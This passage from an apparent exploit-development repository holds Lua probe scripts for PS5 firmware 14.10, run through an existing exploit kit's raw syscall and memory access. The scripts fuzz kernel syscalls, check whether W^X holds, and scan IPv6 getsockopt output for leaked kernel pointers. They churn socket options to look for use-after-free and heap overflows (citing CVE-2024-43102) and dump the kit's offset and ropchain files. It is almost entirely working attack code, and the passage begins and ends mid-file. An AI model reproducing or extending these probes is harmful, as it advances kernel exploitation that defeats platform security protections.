    log("  " .. path .. ": " .. #entries .. " entries")
end

log("")
log("=== FILE RECON DONE ===")
return table.concat(out, "\n")
```

## probes/phase1_identity_layout/06_bug_hunt.lua

```lua
-- 14.10 Recon Probe 06: Targeted Bug Hunting
-- Uses syscall.resolve() properly. No make_syscall hacks.
-- SAFE: probing error paths only

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: BUG HUNT ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6, sc_read = 3, sc_write = 4,
    sc_ioctl = 54, sc_socket = 97,
    sc_setsockopt = 105, sc_getsockopt = 118,
    sc_pipe = 42, sc_mmap = 477, sc_munmap = 73, sc_mprotect = 74,
    sc_kqueueex = 394,
    sc_aio_read = 454, sc_aio_multi_wait = 550, sc_aio_multi_cancel = 549,
})

-- ============================================================
-- HUNT 1: kqueue + kevent edge cases
-- ============================================================
log("")
log("--- HUNT 1: kqueue edge cases ---")

local kq_fd = -1
pcall(function()
    kq_fd = syscall.kqueue():tonumber()
    log("  kqueue fd: " .. kq_fd)
end)

if kq_fd >= 0 then
    pcall(function()
        local changelist = memory.alloc(64)
        local eventlist = memory.alloc(512)
        local pipe_fds = memory.alloc(8)
        syscall.sc_pipe(pipe_fds)
        local rfd = memory.read_dword(pipe_fds):tonumber()
        local wfd = memory.read_dword(pipe_fds + 4):tonumber()

        memory.write_qword(changelist + 0, rfd)
        memory.write_word(changelist + 8, 0xFFFF)
        memory.write_word(changelist + 10, 0x0001)
        memory.write_dword(changelist + 12, 0)
        memory.write_qword(changelist + 16, 0)
        memory.write_qword(changelist + 24, 0)

        local ret = syscall.kevent(kq_fd, changelist, 1, 0, 0, 0)
        log("  kevent register: " .. ret:tonumber())

        local wbuf = memory.alloc(4)
        memory.write_dword(wbuf, 0x41414141)
        syscall.sc_write(wfd, wbuf, 4)

        local ts = memory.alloc(16)
        memory.write_qword(ts, 0)
        memory.write_qword(ts + 8, 0)
        ret = syscall.kevent(kq_fd, 0, 0, eventlist, 8, ts)
        local nevents = ret:tonumber()
        log("  kevent poll: " .. nevents .. " events")

        if nevents > 0 then
            local ev_ident = memory.read_qword(eventlist):tonumber()
            local ev_data = memory.read_qword(eventlist + 16):tonumber()
            log("  event: ident=" .. ev_ident .. " data=" .. ev_data)
        end

        syscall.sc_close(rfd)
        syscall.sc_close(wfd)
        log("  kqueue+kevent: FULLY FUNCTIONAL")
    end)

    pcall(function()
        local kqx_fd = syscall.sc_kqueueex(0):tonumber()
        if kqx_fd >= 0 then
            log("  kqueueex: fd=" .. kqx_fd .. " (AVAILABLE)")
            syscall.sc_close(kqx_fd)
        else
            log("  kqueueex: returned " .. kqx_fd)
        end
    end)

    syscall.sc_close(kq_fd)
end

-- ============================================================
-- HUNT 2: AIO race conditions (Relapse family)
-- ============================================================
log("")
log("--- HUNT 2: aio race surface ---")

pcall(function()
    local pipe_fds = memory.alloc(8)
    syscall.sc_pipe(pipe_fds)
    local rfd = memory.read_dword(pipe_fds):tonumber()
    local wfd = memory.read_dword(pipe_fds + 4):tonumber()

    local aiocb = memory.alloc(256)
    memory.write_dword(aiocb + 0, rfd)

    local ok2, err2 = pcall(function()
        return syscall.sc_aio_read(aiocb)
    end)
    log("  aio_read(pipe): " .. (ok2 and "accepted" or tostring(err2):sub(1,50)))

    local ok3, err3 = pcall(function()
        return syscall.sc_aio_multi_wait(0, 0, 0, 0)
    end)
    log("  aio_multi_wait(NULL): " .. (ok3 and "OK" or tostring(err3):sub(1,50)))

    local ok4, err4 = pcall(function()
        return syscall.sc_aio_multi_cancel(rfd, 0)
    end)
    log("  aio_multi_cancel(pipe): " .. (ok4 and "OK" or tostring(err4):sub(1,50)))

    syscall.sc_close(rfd)
    syscall.sc_close(wfd)
end)

-- ============================================================
-- HUNT 3: IPv6 option handling
-- ============================================================
log("")
log("--- HUNT 3: IPv6 option handling ---")

pcall(function()
    local s = syscall.sc_socket(28, 3, 255)
    local fd = s:tonumber()
    if fd < 0 then
        s = syscall.sc_socket(28, 2, 0)
        fd = s:tonumber()
    end
    log("  IPv6 socket: fd=" .. fd)

    if fd >= 0 then
        local big_buf = memory.alloc(8192)
        local test_opts = {
            {46, "IPV6_PKTINFO"}, {47, "IPV6_HOPLIMIT"},
            {48, "IPV6_NEXTHOP"}, {49, "IPV6_HOPOPTS"},
            {50, "IPV6_DSTOPTS"}, {51, "IPV6_RTHDR"},
            {61, "IPV6_AUTOFLOWLABEL"},
        }

        for _, opt in ipairs(test_opts) do
            for _, sz in ipairs({4, 256, 4096}) do
                local ok2 = pcall(function()
                    return syscall.sc_setsockopt(fd, 41, opt[1], big_buf, sz)
                end)
                if ok2 then
                    log("  " .. opt[2] .. " size=" .. sz .. ": ACCEPTED")
                end
            end
        end

        local optlen = memory.alloc(8)
        for _, opt in ipairs(test_opts) do
            memory.write_dword(optlen, 8192)
            local ok2 = pcall(function()
                return syscall.sc_getsockopt(fd, 41, opt[1], big_buf, optlen)
            end)
            local actual = memory.read_dword(optlen):tonumber()
            if ok2 and actual > 0 then
                log("  GET " .. opt[2] .. ": returned " .. actual .. " bytes")
            end
        end

        syscall.sc_close(fd)
    end
end)

-- ============================================================
-- HUNT 4: mmap edge cases
-- ============================================================
log("")
log("--- HUNT 4: mmap edge cases ---")

pcall(function()
    local addr = syscall.sc_mmap(0, 0x1000, 3, 0x1001, -1, 0)
    local a = addr:tonumber()
    if a > 0 and a ~= 0xFFFFFFFF then
        log("  MAP_SHARED|MAP_ANON: 0x" .. string.format("%x", a))
        local ret = syscall.sc_mprotect(addr, 0x1000, 7)
        log("  mprotect RWX: " .. ret:tonumber() .. (ret:tonumber() == 0 and " (!!W^X broken!!)" or ""))
        syscall.sc_munmap(addr, 0x1000)
    else
        log("  MAP_SHARED|MAP_ANON: failed")
    end

    local addr2 = syscall.sc_mmap(0x10000, 0x1000, 3, 0x1012, -1, 0)
    local a2 = addr2:tonumber()
    log("  MAP_FIXED@0x10000: 0x" .. string.format("%x", a2))
    if a2 > 0 and a2 ~= 0xFFFFFFFF then
        pcall(function() syscall.sc_munmap(addr2, 0x1000) end)
    end
end)

-- ============================================================
-- HUNT 5: device ioctl surface
-- ============================================================
log("")
log("--- HUNT 5: device ioctl surface ---")

local ioctl_targets = {"/dev/null", "/dev/zero", "/dev/urandom"}
for _, dev in ipairs(ioctl_targets) do
    pcall(function()
        local fd = syscall.sc_open(dev, 2):tonumber()
        if fd < 0 then fd = syscall.sc_open(dev, 0):tonumber() end
        if fd >= 0 then
            local buf = memory.alloc(256)
            local interesting = {}
            for cmd = 0, 50 do
                local ok2 = pcall(function()
                    local ret = syscall.sc_ioctl(fd, cmd, buf)
                    if ret:tonumber() == 0 then
                        interesting[#interesting+1] = cmd
                    end
                end)
            end
            if #interesting > 0 then
                log("  " .. dev .. ": " .. #interesting .. " accepted ioctls")
            else
                log("  " .. dev .. ": no ioctls accepted")
            end
            syscall.sc_close(fd)
        end
    end)
end

-- ============================================================
-- HUNT 6: pipe/fd limits
-- ============================================================
log("")
log("--- HUNT 6: fd passing surface ---")

pcall(function()
    local pipe_fds = memory.alloc(8)
    syscall.sc_pipe(pipe_fds)
    local rfd = memory.read_dword(pipe_fds):tonumber()
    local wfd = memory.read_dword(pipe_fds + 4):tonumber()
    log("  pipe: r=" .. rfd .. " w=" .. wfd)

    local max_fds = 0
    for i = 1, 100 do
        local fds = memory.alloc(8)
        local ok2 = pcall(function() syscall.sc_pipe(fds) end)
        if ok2 then
            max_fds = i
            local r = memory.read_dword(fds):tonumber()
            local w = memory.read_dword(fds + 4):tonumber()
            if i == 100 then
                log("  100 pipes created (fd=" .. w .. ")")
            end
            syscall.sc_close(r)
            syscall.sc_close(w)
        else
            break
        end
    end
    log("  max pipes before failure: " .. max_fds)

    syscall.sc_close(rfd)
    syscall.sc_close(wfd)
end)

log("")
log("=== BUG HUNT SUMMARY ===")
log("Key findings above show which attack surfaces are live on 14.10.")
log("Priority targets: aio_multi_*, kqueueex, IPv6 opts, umtx_op")
log("")
log("=== BUG HUNT DONE ===")
return table.concat(out, "\n")
```

## probes/phase1_identity_layout/07_ipv6_leak.lua

```lua
-- 14.10 Recon Probe 07: IPv6 HOPLIMIT getsockopt info leak dump
-- getsockopt(IPV6_HOPLIMIT) returned 8192 bytes in probe 06
-- Dump the raw bytes and scan for kernel pointers

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: IPV6_HOPLIMIT LEAK DUMP ===")
log("fw: " .. tostring(FW_VERSION))

syscall.resolve({
    sc_socket = 97, sc_close = 6,
    sc_setsockopt = 105, sc_getsockopt = 118,
})

-- Create IPv6 UDP socket
local fd = syscall.sc_socket(28, 2, 0):tonumber()
log("socket fd: " .. fd)
if fd < 0 then
    log("FAILED to create socket")
    return table.concat(out, "\n")
end

-- First enable IPV6_RECVHOPLIMIT so the option has data
local optbuf = memory.alloc(4)
memory.write_dword(optbuf, 1)
pcall(function()
    syscall.sc_setsockopt(fd, 41, 37, optbuf, 4) -- IPV6_RECVHOPLIMIT=37
end)

-- Also set HOPLIMIT itself
memory.write_dword(optbuf, 64)
pcall(function()
    syscall.sc_setsockopt(fd, 41, 47, optbuf, 4) -- IPV6_HOPLIMIT=47
end)

-- Now do the leak: getsockopt with large buffer
local LEAK_SIZE = 8192
local leak_buf = memory.alloc(LEAK_SIZE + 16)
local optlen = memory.alloc(8)

-- Zero the buffer first so we can see what kernel writes
for i = 0, LEAK_SIZE - 1, 8 do
    memory.write_qword(leak_buf + i, 0)
end

memory.write_dword(optlen, LEAK_SIZE)
local ok, err = pcall(function()
    return syscall.sc_getsockopt(fd, 41, 47, leak_buf, optlen)
end)

local actual_len = memory.read_dword(optlen):tonumber()
log("getsockopt ret: " .. (ok and "OK" or tostring(err):sub(1,40)))
log("returned length: " .. actual_len)

if actual_len <= 0 then
    syscall.sc_close(fd)
    log("no data returned")
    return table.concat(out, "\n")
end

-- Dump first 4 bytes (the actual hoplimit value)
local val = memory.read_dword(leak_buf):tonumber()
log("hoplimit value: " .. val)

-- Scan for potential kernel pointers
-- PS5 kernel pointers typically: 0xFFFFxxxx_xxxxxxxx (high kernel)
-- or DMAP region: 0xFFFFF8xx_xxxxxxxx
-- or kernel text: 0xFFFFFFFF_8xxxxxxx
log("")
log("--- scanning for kernel pointers ---")
local ptr_count = 0
local unique_ptrs = {}

for i = 0, actual_len - 8, 8 do
    local lo = memory.read_dword(leak_buf + i):tonumber()
    local hi = memory.read_dword(leak_buf + i + 4):tonumber()

    if hi ~= 0 then
        local is_kernel = false
        local tag = ""

        -- Kernel text: 0xFFFFFFFF8xxxxxxx
        if hi >= 0xFFFFFFFF and lo >= 0x80000000 then
            is_kernel = true
            tag = "KTEXT"
        -- DMAP: 0xFFFFF8xxxxxxxxxx
        elseif hi >= 0xFFFFF800 and hi < 0xFFFFFF00 then
            is_kernel = true
            tag = "DMAP"
        -- High kernel: 0xFFFFxxxxxxxxxxxx
        elseif hi >= 0xFFFF0000 then
            is_kernel = true
            tag = "KHIGH"
        -- Userland high: 0x00000008xxxxxxxx (loaded modules)
        elseif hi >= 0x00000008 and hi < 0x00000009 then
            tag = "UMOD"
        -- Heap: 0x00000002xxxxxxxx
        elseif hi >= 0x00000002 and hi < 0x00000004 then
            tag = "HEAP"
        end

        if is_kernel or tag ~= "" then
            local ptr_str = string.format("%08x%08x", hi, lo)
            if not unique_ptrs[ptr_str] then
                unique_ptrs[ptr_str] = true
                ptr_count = ptr_count + 1
                log(string.format("  +%04x: 0x%s [%s]", i, ptr_str, tag))
            end
        end
    end
end

log("")
log("total pointer-like values: " .. ptr_count)

-- Hex dump first 256 bytes
log("")
log("--- hex dump (first 256 bytes) ---")
local cap = math.min(actual_len, 256)
for row = 0, cap - 1, 16 do
    local hex_parts = {}
    local ascii_parts = {}
    for col = 0, 15 do
        if row + col < cap then
            local b = memory.read_byte(leak_buf + row + col):tonumber()
            hex_parts[#hex_parts+1] = string.format("%02x", b)
            if b >= 32 and b < 127 then
                ascii_parts[#ascii_parts+1] = string.char(b)
            else
                ascii_parts[#ascii_parts+1] = "."
            end
        end
    end
    log(string.format("  %04x: %s  %s", row, table.concat(hex_parts, " "), table.concat(ascii_parts)))
end

-- Hex dump bytes 4-16 at qword granularity for pointer analysis
log("")
log("--- qword dump (all " .. actual_len .. " bytes) ---")
local qw_cap = math.min(actual_len, LEAK_SIZE)
for i = 0, qw_cap - 1, 32 do
    local parts = {}
    for j = 0, 24, 8 do
        if i + j + 7 < qw_cap then
            local lo2 = memory.read_dword(leak_buf + i + j):tonumber()
            local hi2 = memory.read_dword(leak_buf + i + j + 4):tonumber()
            parts[#parts+1] = string.format("%08x%08x", hi2, lo2)
        end
    end
    log(string.format("  %04x: %s", i, table.concat(parts, " ")))
end

-- Try other IPv6 options for comparison
log("")
log("--- other IPv6 option sizes ---")
local test_opts = {
    {46, "PKTINFO"}, {47, "HOPLIMIT"}, {48, "NEXTHOP"},
    {49, "HOPOPTS"}, {50, "DSTOPTS"}, {51, "RTHDR"},
    {52, "PKTOPTIONS"}, {61, "AUTOFLOWLABEL"},
}
for _, o in ipairs(test_opts) do
    memory.write_dword(optlen, LEAK_SIZE)
    local ok2 = pcall(function()
        return syscall.sc_getsockopt(fd, 41, o[1], leak_buf, optlen)
    end)
    if ok2 then
        local sz = memory.read_dword(optlen):tonumber()
        log("  " .. o[2] .. " (" .. o[1] .. "): " .. sz .. " bytes")
    else
        log("  " .. o[2] .. " (" .. o[1] .. "): failed")
    end
end

syscall.sc_close(fd)

log("")
log("=== IPV6 LEAK DUMP DONE ===")
return table.concat(out, "\n")
```

## probes/phase1_identity_layout/08_read_offsets.lua

```lua
-- 14.10 Recon Probe 08: Read exploit kit offset files
-- Dump /savedata0/offsets.lua and /savedata0/kernel_offset.lua

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: OFFSET FILES ===")
log("fw: " .. tostring(FW_VERSION))

syscall.resolve({ sc_open = 5, sc_close = 6, sc_read = 3 })

local function read_file(path, max)
    max = max or 16384
    local ok, result = pcall(function()
        local fd = syscall.sc_open(path, 0):tonumber()
        if fd < 0 then return nil end
        local buf = memory.alloc(max + 1)
        local total = {}
        local pos = 0
        while pos < max do
            local chunk = math.min(4096, max - pos)
            local n = syscall.sc_read(fd, buf, chunk):tonumber()
            if n <= 0 then break end
            local chars = {}
            for i = 0, n - 1 do
                local b = memory.read_byte(buf + i):tonumber()
                if b == 0 then break end
                chars[#chars+1] = string.char(b)
            end
            total[#total+1] = table.concat(chars)
            pos = pos + n
        end
        syscall.sc_close(fd)
        return table.concat(total)
    end)
    return ok and result or nil
end

local files = {
    "/savedata0/offsets.lua",
    "/savedata0/kernel_offset.lua",
    "/savedata0/kernel.lua",
    "/savedata0/main.lua",
    "/savedata0/ropchain.lua",
    "/savedata0/memory.lua",
    "/savedata0/syscall.lua",
}

for _, path in ipairs(files) do
    log("")
    log("========== " .. path .. " ==========")
    local content = read_file(path, 32768)
    if content then
        log("size: " .. #content .. " bytes")
        log("")
        log(content)
    else
        log("FAILED to read")
    end
end

log("")
log("=== OFFSET FILES DONE ===")
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/09_ipv6_stress.lua

```lua
-- 14.10 Recon Probe 09: IPv6 setsockopt stress test
-- Target: pktopts UAF, heap overflow, info leak via option churn
-- SAFE: no kernel writes, just probing error paths and observing behavior

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: IPV6 SETSOCKOPT STRESS ===")
log("fw: " .. tostring(FW_VERSION))

syscall.resolve({
    sc_socket = 97, sc_close = 6,
    sc_setsockopt = 105, sc_getsockopt = 118,
    sc_pipe = 42, sc_read = 3, sc_write = 4,
})

local IPPROTO_IPV6 = 41
local IPV6_PKTINFO     = 46
local IPV6_HOPLIMIT    = 47
local IPV6_NEXTHOP     = 48
local IPV6_HOPOPTS     = 49
local IPV6_DSTOPTS     = 50
local IPV6_RTHDR       = 51
local IPV6_PKTOPTIONS  = 52
local IPV6_RECVHOPOPTS = 36
local IPV6_RECVDSTOPTS = 37
local IPV6_RECVRTHDR   = 38
local IPV6_RECVPKTINFO = 25
local IPV6_RECVHOPLIMIT = 37

-- ============================================================
-- STRESS 1: Rapid pktopts alloc/free cycle (UAF surface)
-- Setting an IPv6 option allocates an ip6_pktopts mbuf.
-- Setting it to NULL/0 frees it. Rapid cycling may hit a race.
-- ============================================================
log("")
log("--- STRESS 1: pktopts alloc/free churn ---")

local function make_ipv6_udp()
    local s = syscall.sc_socket(28, 2, 0):tonumber()
    return s
end

local fd1 = make_ipv6_udp()
log("socket fd: " .. fd1)

if fd1 >= 0 then
    local optbuf = memory.alloc(4096)
    local zero4 = memory.alloc(4)
    memory.write_dword(zero4, 0)

    -- Build a valid hop-by-hop header: len=0 means 8 bytes total
    -- Type=0 (Pad1 is single byte), but we need at least 8 bytes
    -- ip6_hbh: nxt(1) + len(1) + options(6) = 8 bytes minimum
    local hbh8 = memory.alloc(8)
    memory.write_byte(hbh8, 0)     -- ip6h_nxt = 0
    memory.write_byte(hbh8 + 1, 0) -- ip6h_len = 0 (8 bytes)
    -- rest = padding (PadN option: type=1, len=4, pad...)
    memory.write_byte(hbh8 + 2, 1) -- PadN type
    memory.write_byte(hbh8 + 3, 4) -- PadN len
    memory.write_dword(hbh8 + 4, 0) -- padding

    local crashes = 0
    local successes = 0

    for round = 1, 200 do
        -- Set HOPOPTS (allocates pktopts)
        local ok1 = pcall(function()
            syscall.sc_setsockopt(fd1, IPPROTO_IPV6, IPV6_HOPOPTS, hbh8, 8)
        end)
        if ok1 then successes = successes + 1 end

        -- Immediately clear it (frees pktopts)
        local ok2 = pcall(function()
            syscall.sc_setsockopt(fd1, IPPROTO_IPV6, IPV6_HOPOPTS, zero4, 0)
        end)

        -- Set DSTOPTS on same socket (reuses freed slot?)
        local ok3 = pcall(function()
            syscall.sc_setsockopt(fd1, IPPROTO_IPV6, IPV6_DSTOPTS, hbh8, 8)
        end)

        -- Clear DSTOPTS
        pcall(function()
            syscall.sc_setsockopt(fd1, IPPROTO_IPV6, IPV6_DSTOPTS, zero4, 0)
        end)
    end
    log("  200 alloc/free rounds: " .. successes .. " set-ok, no crash = kernel handles it")

    -- ============================================================
    -- STRESS 2: Cross-option overlap (set one, read another)
    -- If pktopts struct fields overlap, reading one option after
    -- setting another might leak adjacent heap data
    -- ============================================================
    log("")
    log("--- STRESS 2: cross-option info leak ---")

    -- Set HOPOPTS with a pattern
    local pattern = memory.alloc(64)
    memory.write_byte(pattern, 0)     -- nxt
    memory.write_byte(pattern + 1, 0) -- len=0 (8 bytes)
    memory.write_byte(pattern + 2, 1) -- PadN
    memory.write_byte(pattern + 3, 4) -- PadN len
    memory.write_dword(pattern + 4, 0xDEADBEEF) -- marker

    pcall(function()
        syscall.sc_setsockopt(fd1, IPPROTO_IPV6, IPV6_HOPOPTS, pattern, 8)
    end)

    -- Now read back various options and check for our marker or other data
    local readbuf = memory.alloc(8192)
    local optlen = memory.alloc(8)
    local opts_to_check = {
        {IPV6_PKTINFO, "PKTINFO"}, {IPV6_HOPLIMIT, "HOPLIMIT"},
        {IPV6_NEXTHOP, "NEXTHOP"}, {IPV6_HOPOPTS, "HOPOPTS"},
        {IPV6_DSTOPTS, "DSTOPTS"}, {IPV6_RTHDR, "RTHDR"},
        {IPV6_PKTOPTIONS, "PKTOPTIONS"},
    }

    for _, o in ipairs(opts_to_check) do
        -- Zero readbuf
        for i = 0, 63, 8 do memory.write_qword(readbuf + i, 0) end
        memory.write_dword(optlen, 8192)

        local ok = pcall(function()
            return syscall.sc_getsockopt(fd1, IPPROTO_IPV6, o[1], readbuf, optlen)
        end)
        if ok then
            local sz = memory.read_dword(optlen):tonumber()
            if sz > 0 then
                -- Check for our marker
                local found_marker = false
                local nonzero_bytes = 0
                local interesting = {}
                for i = 0, math.min(sz - 1, 255) do
                    local b = memory.read_byte(readbuf + i):tonumber()
                    if b ~= 0 then nonzero_bytes = nonzero_bytes + 1 end
                end
                -- Check qwords for pointers or our marker
                for i = 0, math.min(sz - 4, 252), 4 do
                    local v = memory.read_dword(readbuf + i):tonumber()
                    if v == 0xDEADBEEF then found_marker = true end
                end
                -- Check for kernel pointers in the excess bytes
                local kptrs = 0
                for i = 0, math.min(sz - 8, 8184), 8 do
                    local hi = memory.read_dword(readbuf + i + 4):tonumber()
                    if hi >= 0xFFFF0000 then kptrs = kptrs + 1 end
                end

                local extra = ""
                if found_marker then extra = extra .. " MARKER_FOUND(!)" end
                if kptrs > 0 then extra = extra .. " KPTRS=" .. kptrs .. "(!)" end
                log("  " .. o[2] .. ": " .. sz .. "B, " .. nonzero_bytes .. " nonzero" .. extra)

                -- Hex dump first 64 bytes if there's interesting data
                if nonzero_bytes > 0 and o[2] ~= "HOPOPTS" then
                    local cap = math.min(sz, 64)
                    local hex = {}
                    for i = 0, cap - 1 do
                        hex[#hex+1] = string.format("%02x", memory.read_byte(readbuf + i):tonumber())
                    end
                    log("    hex: " .. table.concat(hex, " "))
                end
            end
        end
    end

    -- ============================================================
    -- STRESS 3: Multi-socket pktopts race
    -- Create many sockets, set options on all, close in reverse
    -- order — tests allocator ordering
    -- ============================================================
    log("")
    log("--- STRESS 3: multi-socket pktopts allocator ---")

    local socks = {}
    local N = 32

    for i = 1, N do
        local s = make_ipv6_udp()
        if s >= 0 then
            socks[#socks+1] = s
            -- Set PKTINFO on each (allocates pktopts per socket)
            local pktinfo = memory.alloc(20)
            memory.write_dword(pktinfo + 16, i) -- ipi6_ifindex = i as marker
            pcall(function()
                syscall.sc_setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 20)
            end)
        end
    end
    log("  created " .. #socks .. " sockets with PKTINFO")

    -- Read back from each — check if any socket reads another's data
    local leaks = 0
    for idx, s in ipairs(socks) do
        for i = 0, 19 do memory.write_byte(readbuf + i, 0) end
        memory.write_dword(optlen, 20)
        local ok = pcall(function()
            return syscall.sc_getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, readbuf, optlen)
        end)
        if ok then
            local ifidx = memory.read_dword(readbuf + 16):tonumber()
            if ifidx ~= idx and ifidx ~= 0 then
                log("  LEAK: sock " .. idx .. " got ifindex=" .. ifidx .. " (expected " .. idx .. ")")
                leaks = leaks + 1
            end
        end
    end
    if leaks == 0 then
        log("  no cross-socket leaks in PKTINFO")
    end

    -- Close half in reverse, then read remaining
    for i = #socks, math.floor(#socks/2) + 1, -1 do
        syscall.sc_close(socks[i])
        socks[i] = nil
    end
    log("  closed upper half, reading lower half...")

    local uaf_signs = 0
    for idx = 1, math.floor(N/2) do
        local s = socks[idx]
        if s then
            for i = 0, 63, 8 do memory.write_qword(readbuf + i, 0) end
            memory.write_dword(optlen, 64)
            local ok = pcall(function()
                return syscall.sc_getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, readbuf, optlen)
            end)
            if ok then
                local ifidx = memory.read_dword(readbuf + 16):tonumber()
                -- If freed memory was reused, we might see different values
                if ifidx ~= idx and ifidx ~= 0 then
                    log("  UAF?: sock " .. idx .. " now reads ifindex=" .. ifidx)
                    uaf_signs = uaf_signs + 1
                end
                -- Check for any kernel pointers in the returned data
                local sz = memory.read_dword(optlen):tonumber()
                for i = 0, math.min(sz - 8, 56), 8 do
                    local hi = memory.read_dword(readbuf + i + 4):tonumber()
                    if hi >= 0xFFFF0000 then
                        log("  UAF KPTR: sock " .. idx .. " +0x" .. string.format("%x", i) .. " = " ..
                            string.format("%08x%08x", hi, memory.read_dword(readbuf + i):tonumber()))
                        uaf_signs = uaf_signs + 1
                    end
                end
            end
        end
    end
    if uaf_signs == 0 then
        log("  no UAF signs after partial close")
    end

    -- Clean up remaining
    for _, s in pairs(socks) do
        if s then pcall(function() syscall.sc_close(s) end) end
    end

    -- ============================================================
    -- STRESS 4: IPV6_PKTOPTIONS read after option churn
    -- PKTOPTIONS returns ALL set options at once — after rapid
    -- churn, check if it returns stale/freed data
    -- ============================================================
    log("")
    log("--- STRESS 4: PKTOPTIONS stale data check ---")

    local fd2 = make_ipv6_udp()
    if fd2 >= 0 then
        -- Set various options with known patterns
        local buf_a = memory.alloc(8)
        memory.write_byte(buf_a, 0)
        memory.write_byte(buf_a + 1, 0)
        memory.write_byte(buf_a + 2, 1)
        memory.write_byte(buf_a + 3, 4)
        memory.write_dword(buf_a + 4, 0xAAAAAAAA)

        local buf_b = memory.alloc(8)
        memory.write_byte(buf_b, 0)
        memory.write_byte(buf_b + 1, 0)
        memory.write_byte(buf_b + 2, 1)
        memory.write_byte(buf_b + 3, 4)
        memory.write_dword(buf_b + 4, 0xBBBBBBBB)

        -- Churn: set A, read pktoptions, set B, clear A, read pktoptions
        for round = 1, 50 do
            pcall(function() syscall.sc_setsockopt(fd2, IPPROTO_IPV6, IPV6_HOPOPTS, buf_a, 8) end)
            pcall(function() syscall.sc_setsockopt(fd2, IPPROTO_IPV6, IPV6_DSTOPTS, buf_b, 8) end)
            pcall(function() syscall.sc_setsockopt(fd2, IPPROTO_IPV6, IPV6_HOPOPTS, zero4, 0) end)
            pcall(function() syscall.sc_setsockopt(fd2, IPPROTO_IPV6, IPV6_DSTOPTS, zero4, 0) end)
        end

        -- Read PKTOPTIONS — should be empty, but check for stale data
        for i = 0, 255, 8 do memory.write_qword(readbuf + i, 0) end
        memory.write_dword(optlen, 8192)
        local ok = pcall(function()
            return syscall.sc_getsockopt(fd2, IPPROTO_IPV6, IPV6_PKTOPTIONS, readbuf, optlen)
        end)
        if ok then
            local sz = memory.read_dword(optlen):tonumber()
            local nonzero = 0
            local found_aa = false
            local found_bb = false
            for i = 0, math.min(sz - 1, 255) do
                local b = memory.read_byte(readbuf + i):tonumber()
                if b ~= 0 then nonzero = nonzero + 1 end
                if b == 0xAA then found_aa = true end
                if b == 0xBB then found_bb = true end
            end
            local extra = ""
            if found_aa then extra = extra .. " STALE_A(!)" end
            if found_bb then extra = extra .. " STALE_B(!)" end
            log("  PKTOPTIONS after churn: " .. sz .. "B, " .. nonzero .. " nonzero" .. extra)

            if nonzero > 0 then
                local hex = {}
                for i = 0, math.min(sz - 1, 127) do
                    hex[#hex+1] = string.format("%02x", memory.read_byte(readbuf + i):tonumber())
                end
                log("  hex: " .. table.concat(hex, " "))
            end
        end

        syscall.sc_close(fd2)
    end

    -- ============================================================
    -- STRESS 5: Large RTHDR buffer (heap overflow surface)
    -- ip6_rthdr has specific format requirements; send invalid
    -- headers at various sizes to probe bounds checking
    -- ============================================================
    log("")
    log("--- STRESS 5: oversized RTHDR ---")

    local fd3 = make_ipv6_udp()
    if fd3 >= 0 then
        local big = memory.alloc(8192)

        -- Build rthdr type 0 headers of increasing sizes
        -- ip6_rthdr: nxt(1) + len(1) + type(1) + segleft(1) + data...
        local test_sizes = {8, 24, 56, 120, 248, 504, 1016, 2040, 4088, 8184}
        for _, sz in ipairs(test_sizes) do
            memory.write_byte(big, 0)   -- nxt
            memory.write_byte(big + 1, math.floor((sz - 8) / 8)) -- len in 8-byte units
            memory.write_byte(big + 2, 2)   -- type 2 (mobile IPv6)
            memory.write_byte(big + 3, 1)   -- segments left
            -- Fill rest with incremental pattern
            for i = 4, sz - 1 do
                memory.write_byte(big + i, i % 256)
            end

            local ok = pcall(function()
                return syscall.sc_setsockopt(fd3, IPPROTO_IPV6, IPV6_RTHDR, big, sz)
            end)
            local status = "REJECTED"
            if ok then
                status = "ACCEPTED"
                -- Read back and check size
                memory.write_dword(optlen, 8192)
                pcall(function()
                    syscall.sc_getsockopt(fd3, IPPROTO_IPV6, IPV6_RTHDR, readbuf, optlen)
                end)
                local got = memory.read_dword(optlen):tonumber()
                if got ~= sz then
                    status = status .. " readback=" .. got .. "(!)"
                end
                -- Clear for next test
                pcall(function()
                    syscall.sc_setsockopt(fd3, IPPROTO_IPV6, IPV6_RTHDR, zero4, 0)
                end)
            end
            log("  RTHDR size=" .. sz .. ": " .. status)
        end

        syscall.sc_close(fd3)
    end

    syscall.sc_close(fd1)
end

log("")
log("=== IPV6 STRESS DONE ===")
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 10: umtx_op stress test
-- CVE-2024-43102 was a use-after-free in umtx shared memory handling
-- Target: UMTX_OP_SHM (25), UMTX_OP_ROBUST_LISTS (26), and
-- WAIT/WAKE races that can be triggered single-threaded via signals/timers
-- SAFE: probing error paths and observing kernel behavior

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: UMTX_OP STRESS ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op = 557,
    sc_mmap = 477, sc_munmap = 73,
    sc_pipe = 42, sc_close = 6, sc_read = 3, sc_write = 4,
    sc_socket = 97, sc_setsockopt = 105,
    sc_shm_open2 = 532,
    sc_ftruncate = 480,
    sc_thr_self = 434,
})

local UMTX_OP_UNLOCK     = 1

local UMTX_OP_WAKE       = 3

local UMTX_OP_MUTEX_LOCK = 5
local UMTX_OP_MUTEX_UNLOCK = 6

local UMTX_OP_CV_SIGNAL  = 9
local UMTX_OP_CV_BROADCAST = 10
local UMTX_OP_WAIT_UINT  = 11
local UMTX_OP_RW_RDLOCK  = 12
local UMTX_OP_RW_WRLOCK  = 13
local UMTX_OP_RW_UNLOCK  = 14
local UMTX_OP_WAIT_UINT_PRIVATE = 15
local UMTX_OP_WAKE_PRIVATE = 16
local UMTX_OP_MUTEX_WAIT = 17
local UMTX_OP_MUTEX_WAKE = 18
local UMTX_OP_SEM_WAIT   = 19
local UMTX_OP_SEM_WAKE   = 20
